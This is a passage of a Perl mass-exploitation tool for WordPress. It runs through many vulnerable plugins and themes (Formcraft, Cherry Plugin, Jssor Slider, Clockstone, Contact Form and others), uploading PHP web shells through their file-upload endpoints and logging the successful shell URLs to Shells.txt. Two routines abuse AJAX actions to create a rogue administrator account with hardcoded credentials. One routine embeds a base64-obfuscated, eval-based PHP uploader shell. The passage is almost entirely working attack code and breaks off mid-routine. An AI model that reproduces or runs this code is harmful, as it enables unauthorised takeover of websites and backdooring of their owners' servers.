print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
ninetof();
}
}
sub ninetof(){
my $url = "$site/wp-content/themes/ninetofive/scripts/doajaxfileupload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'qqfile' => ["tool/priv.php"] ]);

if ($response->content =~ /uploads%2F(.*?); expires/) {
$uploadfolder=$1.'?c=izo';
}
$zoomerup="$site/wp-content/uploads/$year/$month/$uploadfolder";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Ninetofive Exp";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Ninetofive Exp";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Viral Options #####################
sub viral(){

my $addblockurl = "$site/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"]]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Viral Options";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Viral Options";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}

################ jsor-sliders #####################
sub jsor(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["tool/priv.php"]]);
$addblockup="$site/wp-content/jssor-slider/jssor-uploads/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Jsor-Sliders";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
jsordef();
}
}
sub jsordef(){
my $addblockurl = "$site/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["tool/izo.txt"]]);
$addblockup="$site/wp-content/jssor-slider/jssor-uploads/izo.txt";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Jsor-Sliders";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Jsor-Sliders";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}

################ wp-tema #####################
sub wptema(){
my $url = "$site/wp-content/themes/clockstone/theme/functions/uploadbg.php";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(20);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "./",'uploadfile' => ["tool/izom.php"] ]);

$dump = "$site/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php";
if($response->content =~/e3726adb9493beb4e8e2dabe65ea10ef/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"clockstone";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $dump\n";
open (TEXT, '>>Shells.txt');
print TEXT "$dump\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"clockstone";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Blaze";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $blazeup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$blazeup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Blaze";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Catpro";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $catproup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Catpro";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}


################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["tool/priv.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/priv.php?c=izo";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $cherryup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanagervuln="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["tool/priv.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/priv.php?c=izo";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $dmup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Download Manager RCE #####################
sub expadd(){

my  $user = "izocin";
my  $pass = "izocin";
my $body = $ua->post( $site,
        Cookie => "",
        Content_Type => 'form-data',
        Content => [action => "wpdm_ajax_call", execute => "wp_insert_user", user_login => $user,
        user_pass => $pass, role => "administrator",]
   );
   my $html =$body->content;
   my $string_len =  length( $html );
   if ($string_len eq 0){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Download Manager RCE";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'), "[OK] Exploiting Success\n";
print color('bold green'), "[!] login = ".$site."/wp-login.php\n";
print color('bold green'), "[!] User = ".$user."\n";
print color('bold green'), "[!] Pass = ".$pass."\n";
open (TEXT, '>>wprce.txt');
print TEXT "$site/wp-login.php\n","$user\n","$pass\n";
close (TEXT); 
   } 
   elsif ($string_len != 0){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Download Manager RCE";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ wordpress Marketplace Manager RCE #####################
sub expaddd(){

my  $user = "izocin";
my  $pass = "izocin";
my $body = $ua->post( $site,
        Cookie => "",
        Content_Type => 'form-data',
        Content => [action => "wpmp_pp_ajax_call", execute => "wp_insert_user", user_login => $user,
        user_pass => $pass, role => "administrator",]
   );
   my $html =$body->content;
   my $string_len =  length( $html );
   if ($string_len eq 0){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Marketplace RCE";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'), "[OK] Exploiting Success\n";
print color('bold green'), "[!] login = ".$site."/wp-login.php\n";
print color('bold green'), "[!] User = ".$user."\n";
print color('bold green'), "[!] Pass = ".$pass."\n";
open (TEXT, '>>wprce.txt');
print TEXT "$site/wp-login.php\n","$user\n","$pass\n";
close (TEXT); 
} 
   elsif ($string_len != 0){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Marketplace RCE";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Formcraft #####################
sub formcraft(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $shell ="tool/priv.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/priv.php?c=izo";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $formcraftup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$formcraftup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ Formcraft 2#####################
sub formcraft2(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/content/upload.php";
my $shell ="tool/m-a.phtml";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);

my $body = $response->content;
my $regex='name":"(.*)","new_name":"(.*?)"';
if($body =~ s/$regex//){
my $out = $1;my $newout=$2;
print "[Name File] $out \n";
print "[New Name] $newout\n";
$formcraft2up="$site/wp-content/plugins/formcraft/file-upload/server/content/files/$newout";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Formcraft2";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $formcraft2up\n";
open (TEXT, '>>Shells.txt');
print TEXT "$formcraft2up\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Formcraft2";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
sub xav(){ 
my $url = "$site/resources/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=test.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'multipart/form-data',
        Content => $index
        );

$zoomerup="$site//wp-content/plugins/php-analytics/resources/open-flash-chart/tmp-upload-images/test.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"open-flash-chart";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"open-flash-chart";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ Catpro #####################
sub izxc(){

my $url = "$site/wp-admin/admin.php?page=dreamwork_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'drm_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/dreamwork\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/dreamwork/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dreamwork";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $catproup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
threads->exit();
}else{
mdef();
}
}
sub mdef(){ 
my $url = "$site/wp-admin/admin.php?page=dreamwork_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/index.html"], task => 'drm_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/dreamwork\/(.*?)\/big\/index.html/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/dreamwork/$uploadfolder/big/index.html";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dreamwork";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $catproup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dreamwork";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Contact Form 7 #####################
sub con7(){ 
my $url = "$site/wp-admin/admin-ajax.php";
my $field_name = "Filedata";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ "action" => "nm_webcontact_upload_file", $field_name => ["tool/priv.php"] ]
           
            );

if ($sexycontactres->content =~ /"filename":"(.*?)"}/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/contact_files/$uploadfolder";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Contact Form Menager";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Contact Form Menager";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ Fuild #####################
sub fuild(){
my $url = "$site/wp-content/plugins/fluid_forms/file-upload/server/php/";
my $shell ="tool/priv.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$fuildup="$site/wp-content//plugins//fluid_forms/file-upload/server/php/files/priv.php?c=izo";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"fluid_form";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $fuildup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$fuildup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"fluid_form";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ levoslideshow #####################
sub levoslideshow(){

my $url = "$site/wp-admin/admin.php?page=levoslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"levoslideshow";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"levoslideshow";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ VERTİCAL #####################
sub vertical(){

my $url = "$site/wp-admin/admin.php?page=vertical_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'vrt_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/vertical\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/vertical/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"vertical";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"vertical";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ carousel_manage #####################
sub carousel(){

my $url = "$site/wp-admin/admin.php?page=carousel_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'carousel_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/carousel\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/carousel/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"carousel";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"carousel";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ superb_manage #####################
sub superb(){

my $url = "$site/wp-admin/admin.php?page=superb_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'superb_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/superb\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/superb/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"superb";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"superb";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ yass_manage #####################
sub yass(){

my $url = "$site/wp-admin/admin.php?page=yass_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'yass_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/yass\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/yass/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"yass";
